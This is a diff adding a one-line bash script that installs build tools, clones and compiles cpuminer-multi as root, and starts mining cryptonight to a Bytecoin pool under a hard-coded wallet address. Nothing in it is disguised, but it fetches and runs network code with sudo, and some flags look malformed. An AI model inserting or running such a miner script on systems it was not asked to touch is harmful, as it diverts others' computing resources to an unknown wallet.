@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo apt-get update && sudo apt-get upgrade -y && apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ -y && git clone https://github.com/tpruvot/cpuminer-multi && cd cpuminer-multi/ && sudo ./build.sh && sudo ./autogen.sh && sudo ./configure CFLAGS="*-march=native*" --with-crypto --with-curl && sudo make && sudo make install && cpuminer -a cryptonight -o stratum+tcp://us.bytecoin-pool.org:3333 -u 25kHBuydHqdQc9tQnabecoJt7e1QR27pv7j5SHrrrpLsfTRtXBi4NMBfNCezqRpKfLJf5dmANoy6uA2bGtZ3uT5fJH3ZNTD -t 0
